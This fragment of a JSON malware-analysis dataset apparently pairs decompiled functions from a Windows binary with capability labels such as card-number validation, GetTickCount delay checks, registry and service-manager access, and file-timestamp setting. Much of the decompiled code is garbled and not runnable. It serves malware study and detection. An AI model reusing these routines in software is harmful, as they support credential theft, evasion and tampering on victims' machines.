        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403fd0) overlaps instruction at (ram,0x00403fcf)\n// \n\nuint8_t * __cdecl fcn.00403f50(uint8_t *arg_8h, uint *arg_ch, uint *noname_2, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t in_ECX;\n    uint8_t *puVar4;\n    uint32_t unaff_EBX;\n    uchar *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    bool bVar8;\n    \n    puVar5 = &stack0xfffffffc;\n    puVar4 = (arg_8h - arg_14h) + arg_ch;\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if (arg_8h <= puVar4) {\n        do {\n            puVar3 = &stack0xfffffff0;\n            if (puVar4 < arg_8h) {\n                if (puVar4 < arg_8h) goto code_r0x00403fbd;\n                puVar7 = arg_ch + 1;\n                puVar6 = noname_2 + 1;\n                *arg_ch = *noname_2;\n                unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n                puVar5 = 0x8ae181d0;\n                puVar4[0x75cb3a1e] = puVar4[0x75cb3a1e] | in_ECX;\n                in_ECX = in_ECX + *(unaff_EBX + 0x7e8d144d);\n                piVar1 = in_ECX - 0x73;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + in_ECX;\n                arg_8h = &stack0xfffffff0;\n                if (!SCARRY4(iVar2, in_ECX)) goto code_r0x00403fcf;\n                arg_ch = arg_ch + 5;\n                bVar8 = *puVar6 == *puVar7;\ncode_r0x00403fd3:\n                if (bVar8) {\n                    return puVar3;\n                }\n                noname_2 = *(puVar5 + 0x10);\n                arg_8h = puVar3;\n            }\n            else {\ncode_r0x00403fbd:\n                in_ECX = in_ECX & 0xffffff00 | *arg_8h;\n                unaff_EBX = unaff_EBX & 0xffffff00 | *noname_2;\n                if (*arg_8h == *noname_2) {\n                    puVar7 = noname_2 + 1;\n                    in_ECX = *(puVar5 + 0x14) - 1;\n                    puVar6 = arg_8h + 1;\ncode_r0x00403fcf:\n                    unaff_EBX = 0;\n                    bVar8 = true;\n                    do {\n                        puVar3 = arg_8h;\n                        arg_ch = puVar7;\n                        if (in_ECX == 0) break;\n                        in_ECX = in_ECX - 1;\n                        arg_ch = puVar7 + 1;\n                        bVar8 = *puVar6 == *puVar7;\n                        puVar6 = puVar6 + 1;\n                        puVar7 = arg_ch;\n                    } while (bVar8);\n                    goto code_r0x00403fd3;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= puVar4);\n    }\n    return NULL;\n}\n",
        "token_count": 843
    },
    "004041b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040420e) overlaps instruction at (ram,0x00404209)\n// \n\nuint __cdecl fcn.004041b0(uint filename, uint mode, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    char extraout_DL;\n    int32_t extraout_EDX;\n    uint8_t *unaff_EDI;\n    uint8_t in_AF;\n    char cVar3;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar4;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    cVar3 = arg_10h - *unaff_EDI;\n    uVar2 = func_0x1018a158((in_NT & 1) * 0x4000 | SBORROW1(arg_10h, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                            (in_TF & 1) * 0x100 | (cVar3 < '\\0') * 0x80 | (cVar3 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                            ((POPCOUNT(cVar3) & 1U) == 0) * 4 | arg_10h < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                            (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000, arg_14h, iVar1);\n    *(iVar1 + 0x51) = *(iVar1 + 0x51) + extraout_DL;\n    (*_sym.imp.MSVCRT.dll_fwrite)(uVar2, 1);\n    cVar4 = SCARRY4(extraout_EDX, 1);\n    cVar3 = extraout_EDX + 1 < 0;\n    uVar2 = (*_sym.imp.MSVCRT.dll_fflush)();\n    if ((cVar4 == cVar3) && (cVar4 != cVar3)) {\n        out(0xc4, uVar2);\n        *(unaff_EDI + 1) = uVar2;\n    }\n    (*_sym.imp.MSVCRT.dll_fclose)(0x34a96cf4);\n    return 1;\n}\n",
        "token_count": 608
    },
    "004042a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004042a0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00404350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404350(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    uchar *hSCManager;\n    int16_t unaff_DI;\n    bool bVar3;\n    unkbyte6 Var4;\n    \n    bVar3 = unaff_DI == 0;\n    Var4 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    puVar1 = Var4;\n    hSCManager = puVar1;\n    if ((!bVar3) && (bVar3)) {\n        hSCManager = puVar1 + 1;\n        out(*puVar1, Var4 >> 0x20);\n    }\n    uVar2 = fcn.00404af0(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar2;\n}\n",
        "token_count": 206
    },
    "00404530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404646) overlaps instruction at (ram,0x00404645)\n// \n// WARNING: Removing unreachable block (ram,0x004045b5)\n// WARNING: Removing unreachable block (ram,0x0040465b)\n// WARNING: Removing unreachable block (ram,0x004046a4)\n// WARNING: Removing unreachable block (ram,0x004045ee)\n// WARNING: Removing unreachable block (ram,0x004045dc)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __fastcall fcn.00404530(int32_t param_1, uint param_2, char **param_3)\n\n{\n    uint8_t *puVar1;\n    uchar *puVar2;\n    float10 fVar3;\n    float10 fVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    uint8_t in_AL;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    uint16_t uVar10;\n    char cVar12;\n    char *pcVar11;\n    int32_t *piVar13;\n    int32_t *piVar14;\n    int32_t unaff_EBX;\n    uchar *puVar15;\n    char *unaff_ESI;\n    char *pcVar16;\n    int32_t *unaff_EDI;\n    char **ppcVar17;\n    bool in_CF;\n    bool bVar18;\n    uint8_t in_AF;\n    uchar in_ZF;\n    bool bVar19;\n    bool bVar20;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar21;\n    uint8_t in_NT;\n    float10 in_ST0;\n    float10 extraout_ST0;\n    float10 fVar22;\n    float10 in_ST1;\n    float10 extraout_ST1;\n    float10 fVar23;\n    float10 in_ST2;\n    float10 fVar24;\n    float10 in_ST3;\n    float10 fVar25;\n    float10 in_ST4;\n    float10 fVar26;\n    float10 in_ST5;\n    float10 fVar27;\n    float10 in_ST6;\n    float10 in_ST7;\n    uint64_t uVar28;\n    uint16_t uStackY22;\n    \n    uVar28 = CONCAT44(param_2, param_3);\n    puVar15 = &stack0xfffffffc;\n    if ((in_CF) || (!in_CF)) {\n        *param_3 = 0x17;\n    }\n    else {\n        cVar12 = in_AL - *unaff_EDI;\n        unaff_ESI = unaff_ESI + -1;\n        uVar28 = func_0x1018a4c0((in_NT & 1) * 0x4000 | SBORROW1(in_AL, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                                 (in_TF & 1) * 0x100 | (cVar12 < '\\0') * 0x80 | (cVar12 == '\\0') * 0x40 |\n                                 (in_AF & 1) * 0x10 | ((POPCOUNT(cVar12) & 1U) == 0) * 4 | in_AL < *unaff_EDI);\n        in_CF = false;\n        in_ZF = (*(uVar28 + unaff_EBX + -0x7f) & 0x4b) == 0;\n        param_1 = unaff_EBX + 0xc60845;\n        in_ST0 = extraout_ST0;\n        in_ST1 = extraout_ST1;\n    }\n    piVar13 = uVar28 >> 0x20;\n    pcVar11 = uVar28;\n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    pcVar11[1] = -0x46;\n    pcVar11[2] = -0x23;\n    pcVar11[3] = '|';\n    *(param_3 + 1) = 0xfc;\n    *(param_3 + 5) = 0x15;\n    *(param_3 + 6) = 0xe8;\n    *(param_3 + 7) = 0x47;\n    *(param_3 + 2) = 0x14;\n    uVar10 = CONCAT11(((uVar28 >> 8) - unaff_EBX) + 'M', uVar28) & 0x26ae;\n    bVar21 = SBORROW2(uVar10, 1);\n    bVar20 = uVar10 - 1 < 0;\n    bVar19 = uVar10 == 1;\n    *(param_3 + 9) = 0xa1;\n    if ((!bVar19) && (bVar19)) {\n        bVar21 = false;\n        pcVar11 = pcVar11 & 0xe2f4cc58;\n        bVar20 = pcVar11 < 0;\n        bVar19 = (uVar28 & 0xe2f4cc58) == 0;\n    }\n    *(param_3 + 10) = 0x12;\n    piVar14 = piVar13;\n    puVar2 = &stack0xfffffffc;\n    pcVar16 = unaff_ESI;\n    ppcVar17 = param_3;\n    fVar22 = in_ST0;\n    fVar23 = in_ST1;\n    fVar24 = in_ST2;\n    fVar25 = in_ST3;\n    fVar26 = in_ST4;\n    fVar27 = in_ST5;\n    if (bVar21 != bVar20) goto code_r0x0040465a;\n    do {\n        piVar14 = piVar13;\n        puVar2 = puVar15;\n        pcVar16 = unaff_ESI;\n        param_3 = ppcVar17;\n        fVar22 = in_ST0;\n        fVar23 = in_ST1;\n        fVar24 = in_ST2;\n        fVar25 = in_ST3;\n        fVar26 = in_ST4;\n        fVar27 = in_ST5;\n        if (bVar21 != bVar20) {\n            out(0xc4, pcVar11);\n            piVar14 = piVar13 & 0xffffff00 | piVar13 ^ param_1;\n            param_3 = ppcVar17 + 1;\n            *ppcVar17 = pcVar11;\n            bVar19 = unaff_EBX >> 8 == *pcVar11;\n            unaff_EDI = piVar14;\n        }\ncode_r0x0040465a:\n        piVar13 = unaff_EDI;\n        puVar15 = puVar2;\n        *(param_3 + 0xb) = 0xa3;\n        unaff_ESI = pcVar16;\n        in_ST0 = fVar22;\n        fVar3 = fVar23;\n        fVar4 = fVar24;\n        fVar5 = fVar25;\n        fVar6 = fVar26;\n        fVar7 = fVar27;\n        if (bVar19) goto code_r0x00404676;\n        if (!bVar19) goto code_r0x00404676;\n        pcVar11 = pcVar11 & 0xffffff00 | *0x4bb148d3;\n        while( true ) {\n            unaff_ESI = pcVar16 + 1;\n            out(*pcVar16, piVar14);\n            in_ST0 = fVar22;\n            fVar3 = fVar23;\n            fVar4 = fVar24;\n            fVar5 = fVar25;\n            fVar6 = fVar26;\n            fVar7 = fVar27;\ncode_r0x00404676:\n            fVar27 = in_ST6;\n            fVar26 = fVar7;\n            fVar25 = fVar6;\n            fVar24 = fVar5;\n            fVar23 = fVar4;\n            fVar22 = fVar3;\n            *(param_3 + 3) = 0xb2;\n            uStackY22 = pcVar11;\n            *(param_3 + 0xd) = 0xeb;\n            bVar21 = false;\n            uStackY22 = uStackY22 ^ unaff_EBX;\n            bVar20 = uStackY22 < 0;\n            bVar19 = uStackY22 == 0;\n            bVar18 = (POPCOUNT(uStackY22 & 0xff) & 1U) == 0;\n            *(param_3 + 0xe) = 2;\n            uVar8 = pcVar11;\n            *(param_3 + 0xf) = 0xaa;\n            cVar12 = pcVar11 >> 8;\n            if ((0 < uStackY22) && (uStackY22 < 1)) break;\n            *(param_3 + 4) = 0x5a;\n            pcVar16 = unaff_ESI;\n            if ((bVar18) || (!bVar18)) {\ncode_r0x004046ed:\n                *(param_3 + 0x11) = 0xff;\n                if ((!bVar20) && (bVar20)) {\n                    *(param_3 + 7) = in_ST0;\n                    param_3 = param_3 + 5;\n                    pcVar16 = pcVar16 + 5;\n                    in_ST0 = fVar22;\n                    fVar22 = fVar23;\n                }\n                *(param_3 + 0x12) = 0xe4;\n                *(param_3 + 0x13) = 0xe6;\n                bVar20 = false;\n                *(param_3 + 5) = 0x3b;\ncode_r0x00404744:\n                bVar21 = false;\n                bVar19 = false;\n                if (bVar20) {\n                    ppcVar17 = param_3 + 1;\n                    puVar1 = pcVar16 + 4;\n                    *(param_3 + 7) = in_ST0;\n                    param_3 = param_3 + 5;\n                    bVar19 = *puVar1 < *ppcVar17;\n                    bVar21 = SBORROW1(*puVar1, *ppcVar17);\n                    bVar20 = *puVar1 - *ppcVar17 < '\\0';\n                    in_ST0 = fVar22;\n                }\n                *(param_3 + 0x15) = 0xdb;\n                if ((bVar21 != bVar20) || (bVar21 == bVar20)) {\n                    pcVar11 = *(puVar15 + 0xc);\n                }\n                *(pcVar11 + -0x7ce92414) = in_ST0;\n                uVar9 = pcVar11 + -1;\n                uVar8 = 9 < (uVar9 & 0xf) | in_AF;\n                uVar9 = uVar9 + uVar8 * '\\x06';\n                *piVar14 = *piVar14 + 0x458bdf84;\n                *(pcVar11 + -1 & 0xffffff00 | uVar9 + (0x90 < (uVar9 & 0xf0) | bVar19 | uVar8 * (0xf9 < uVar9)) * '`' |\n                 0x5f) = 0x16;\n                return;\n            }\n            pcVar16 = *param_3;\n            *param_3 = unaff_ESI;\n            puVar15 = puVar15 + -*(puVar15 + 0x5f9dff63);\n            if (-1 < puVar15) {\n                bVar20 = pcVar16 < 0;\n                if (!bVar20) goto code_r0x00404744;\n                goto code_r0x004046ed;\n            }\n            *param_3 = in_ST0;\n            *pcVar11 = *pcVar11 + uVar8;\n            pcVar11[0x4bb148d3] = pcVar11[0x4bb148d3] + cVar12;\n            in_ST6 = in_ST7;\n        }\n        in_AF = 9 < (uVar8 & 0xf) | in_AF;\n        pcVar11 = pcVar11 & 0xffff0000 | CONCAT11(cVar12 + in_AF, uVar8 + in_AF * '\\x06') & 0xff0f;\n        ppcVar17 = param_3;\n        in_ST1 = fVar22;\n        in_ST2 = fVar23;\n        in_ST3 = fVar24;\n        in_ST4 = fVar25;\n        in_ST5 = fVar26;\n        in_ST6 = fVar27;\n        unaff_EDI = piVar13;\n        if (param_1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    } while( true );\n}\n",
        "token_count": 2884
    },
    "00404780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004047ad) overlaps instruction at (ram,0x004047aa)\n// \n// WARNING: Removing unreachable block (ram,0x0040479e)\n// WARNING: Removing unreachable block (ram,0x004047a6)\n\nvoid __cdecl fcn.00404780(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    ushort extraout_DX;\n    uchar *unaff_ESI;\n    uint *puVar2;\n    bool bVar3;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    bVar3 = true;\n    fcn.00404530(&var_68h, &var_4h);\n    if ((!bVar3) && (bVar3)) {\n        out(*unaff_ESI, extraout_DX);\n    }\n    fcn.00402010(&var_68h, var_4h, 0x411728, 0x12000);\n    *arg_8h = 0x411728;\n    *arg_ch = 0x12000;\n    return;\n}\n",
        "token_count": 352
    },
    "00404d00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404d35) overlaps instruction at (ram,0x00404d34)\n// \n\nvoid __cdecl fcn.00404d00(uint32_t arg_8h, uint *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint *puVar5;\n    char cVar7;\n    uint in_EAX;\n    int32_t iVar6;\n    int32_t in_ECX;\n    uint8_t uVar8;\n    char *in_EDX;\n    uint32_t unaff_EBX;\n    uint *unaff_ESI;\n    uint *puVar9;\n    uint *unaff_EDI;\n    bool in_PF;\n    bool bVar10;\n    uint8_t in_AF;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if ((!in_PF) && (in_PF)) {\n        puVar9 = unaff_ESI + 1;\n        out(*unaff_ESI, in_EDX);\n        do {\n            cVar7 = in_EAX >> 8;\n            in_AF = 9 < (in_EAX & 0xf) | in_AF;\n            in_EAX = CONCAT31(CONCAT21(in_EAX >> 0x10, cVar7 - in_AF), -in_AF);\n        } while (in_AF || cVar7 == *in_EDX);\n        puVar1 = unaff_EDI + in_EDX * 2;\n        uVar2 = *puVar1;\n        uVar3 = *puVar1;\n        *puVar1 = (uVar3 + 0x7b) - in_AF;\n        uVar4 = *puVar1;\n        bVar10 = (POPCOUNT(*puVar1 & 0xff) & 1U) == 0;\n        *(in_ECX + -0x75) = in_EAX;\n        arg_ch = unaff_EDI;\n        if ((SBORROW4(uVar2, -0x7b) != SBORROW4(uVar3 + 0x7b, in_AF)) == uVar4 < 0) goto code_r0x00404d2b;\n    }\n    puVar9 = NULL;\n    puVar5 = arg_ch;\n    if (arg_ch != NULL) {\n        do {\n            bVar10 = (POPCOUNT(puVar5 & 0xff) & 1U) == 0;\n            unaff_EBX = arg_8h;\n            if (bVar10) {\ncode_r0x00404d35:\n                iVar6 = (*_sym.imp.MSVCRT.dll_rand)();\n                in_ECX = 0x1a;\n                in_EDX = iVar6 % 0x1a;\n            }\n            else {\ncode_r0x00404d2b:\n                arg_8h = unaff_EBX;\n                if (!bVar10) goto code_r0x00404d35;\n                *(in_ECX + 0x1ab9) = *(in_ECX + 0x1ab9) + unaff_EBX;\n                arg_8h = unaff_EBX & 0xffff0000 | CONCAT11((unaff_EBX >> 8) + (in_EDX >> 8), unaff_EBX);\n            }\n            uVar8 = in_EDX + 0x61;\n            in_EDX = in_EDX & 0xffffff00 | uVar8;\n            *(puVar9 + arg_8h) = uVar8;\n            puVar9 = puVar9 + 1;\n            puVar5 = puVar9 - arg_ch;\n        } while (puVar9 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 812
    },
    "004026b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get session user name"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004026b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 271
    },
    "00404250": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404250(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00402c40": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402cda) overlaps instruction at (ram,0x00402cd9)\n// \n// WARNING: Removing unreachable block (ram,0x00402cc5)\n// WARNING: Removing unreachable block (ram,0x00402cda)\n// WARNING: Removing unreachable block (ram,0x00402c87)\n// WARNING: Removing unreachable block (ram,0x00402c8d)\n\nuint fcn.00402c40(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar2 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(*(uVar2 + 8), *(uVar2 + 0xc), 0, 0xf003f, uVar2 - 4);\n    if (iVar1 != 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(*(uVar2 - 4), *(uVar2 + 0x10), 0, *(uVar2 + 0x14));\n    if (iVar1 == 0) {\n        uVar3 = *(uVar2 - 8);\n    }\n    else {\n        uVar3 = 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*(uVar2 - 4));\n    return uVar3;\n}\n",
        "token_count": 340
    },
    "004042d0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040433b) overlaps instruction at (ram,0x00404336)\n// \n\nvoid __fastcall\nfcn.004042d0(uint32_t param_1, int32_t param_2, uint param_3, uint param_4, uint32_t param_5, uint32_t param_6)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    bool bVar8;\n    bool bVar9;\n    bool bVar10;\n    uint auStack24 [2];\n    \n    puVar6 = &stack0xfffffffc;\n    uVar7 = 0;\n    bVar8 = false;\n    bVar10 = false;\n    bVar9 = param_6 == 0;\n    uVar1 = param_6;\n    if (0 < param_6) {\n        do {\n            if ((!bVar9 && bVar10 == uVar1 < 0) && (bVar9 || bVar10 != uVar1 < 0)) {\n                *(param_6 + 0x8a39da56) = *(param_6 + 0x8a39da56) ^ param_1;\n                bVar8 = param_6 < 0x3e;\n                param_6 = param_6 & 0xffffff00 | param_6 - 0x3e;\n            }\n            if ((bVar8) || (!bVar8)) {\n                param_2 = uVar7 >> 0x1f;\n                param_6 = uVar7;\n            }\n            param_5 = param_5 ^ *(param_5 + 0xe58be73);\n            param_2 = CONCAT44(param_2, param_6) % *(puVar6 + 0xc);\n            uVar1 = *(puVar6 + 8);\n            uVar3 = param_1 >> 8 & uVar1 ^ 6;\n            if ((uVar3 < '\\x01') || ('\\0' < uVar3)) {\n                param_6 = *(puVar6 + 0x14);\n                uVar3 = param_6 ^ puVar6 + 0x76U ^ *(param_2 + uVar1);\n                param_1 = param_1 & 0xffffff00 | uVar3;\n                *(uVar7 + param_5) = uVar3;\n            }\n            else {\n                *(uVar1 + 0x8b39da56) = *(uVar1 + 0x8b39da56) ^ param_1;\n                puVar5 = puVar6 + 1;\n                puVar4 = auStack24 + 1;\n                puVar6 = auStack24 + 1;\n                cVar2 = '\\a';\n                do {\n                    puVar5 = puVar5 + -1;\n                    puVar4 = puVar4 + -1;\n                    *puVar4 = *puVar5;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n                param_6 = uVar1 & 0xffffff00 | uVar1 + 0x8a | 0x3e;\n            }\n            uVar7 = uVar7 + 1;\n            bVar8 = uVar7 < param_6;\n            bVar10 = SBORROW4(uVar7, param_6);\n            bVar9 = uVar7 == param_6;\n            uVar1 = uVar7 - param_6;\n        } while (uVar7 < param_6);\n    }\n    return;\n}\n",
        "token_count": 814
    },
    "00404d60": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404dca) overlaps instruction at (ram,0x00404dc7)\n// \n\nuint fcn.00404d60(uint param_1, uchar *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    char *pcVar10;\n    char *pcVar11;\n    char *pcVar12;\n    uint *puVar13;\n    uint8_t in_AF;\n    bool bVar14;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar15;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uchar *puStack596;\n    uint uStack592;\n    uchar *puStack588;\n    uint32_t uStack584;\n    uchar *puStack580;\n    uint uStack576;\n    char cStack560;\n    uint uStack559;\n    uchar uStack300;\n    uint uStack299;\n    uchar auStack40 [20];\n    uchar auStack20 [16];\n    \n    puVar8 = &stack0xfffffffc;\n    cStack560 = '\\0';\n    uStack300 = '\\0';\n    puVar9 = &stack0xfffffdd1;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    bVar15 = false;\n    puVar9 = &stack0xfffffed5;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    puStack580 = &stack0xfffffdd0;\n    uStack576 = 0x104;\n    uStack584 = 0x404db3;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    if ((!bVar15) && (bVar15)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar5 = 0xffffffff;\n    pcVar11 = &stack0xfffffdd0;\n    do {\n        pcVar10 = pcVar11;\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        pcVar10 = pcVar11 + 1;\n        cVar1 = *pcVar11;\n        pcVar11 = pcVar10;\n    } while (cVar1 != '\\0');\n    uVar5 = ~uVar5;\n    puVar9 = pcVar10 + -uVar5;\n    puVar13 = &stack0xfffffed4;\n    for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar13 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    for (uVar6 = uVar5 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar13 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    uVar2 = uVar5;\n    cVar1 = uVar2 - *0x407060;\n    uStack584 = (in_NT & 1) * 0x4000 | SBORROW1(uVar2, *0x407060) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4\n                | uVar2 < *0x407060 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                (in_AC & 1) * 0x40000;\n    puStack588 = 0x404e05;\n    func_0x1018ad7d();\n    uVar5 = 0xffffffff;\n    pcVar11 = 0x80e0c1;\n    do {\n        pcVar10 = pcVar11;\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        pcVar10 = pcVar11 + 1;\n        cVar1 = *pcVar11;\n        pcVar11 = pcVar10;\n    } while (cVar1 != '\\0');\n    uVar5 = ~uVar5;\n    iVar4 = -1;\n    pcVar11 = &stack0xfffffed4;\n    do {\n        pcVar12 = pcVar11;\n        if (iVar4 == 0) break;\n        iVar4 = iVar4 + -1;\n        pcVar12 = pcVar11 + 1;\n        cVar1 = *pcVar11;\n        pcVar11 = pcVar12;\n    } while (cVar1 != '\\0');\n    puVar9 = pcVar10 + -uVar5;\n    puVar13 = pcVar12 + -1;\n    for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar13 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar13 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    puStack588 = &stack0xffffffd8;\n    puStack596 = &stack0xfffffed4;\n    uStack592 = 0;\n    puVar3 = (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)();\n    bVar15 = param_2 != 0xffffffff;\n    bVar14 = param_2 == 0xffffffff;\n    puVar7 = param_2;\n    if (bVar14) {\n        puVar3 = fcn.00404250(param_1);\n        bVar15 = puVar3 != 0xffffffff;\n        bVar14 = puVar3 == 0xffffffff;\n        puVar7 = puVar3;\n        if (bVar14) {\n            return 0;\n        }\n    }\n    if ((bVar15 || bVar14) || (!bVar15 && !bVar14)) {\n        puVar3 = &stack0xffffffec;\n    }\n    else {\n        *(puVar13 + -0x73) = *(puVar13 + -0x73) - &stack0xfffffdac;\n        puVar8 = &stack0xfffffffd;\n        LOCK();\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(puVar7, puVar8 + -0x20, puVar8 + -0x18, puVar3);\n    if (param_2 == 0xffffffff) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar7);\n    }\n    return 1;\n}\n",
        "token_count": 1809
    },
    "00402190": {
        "rules": [
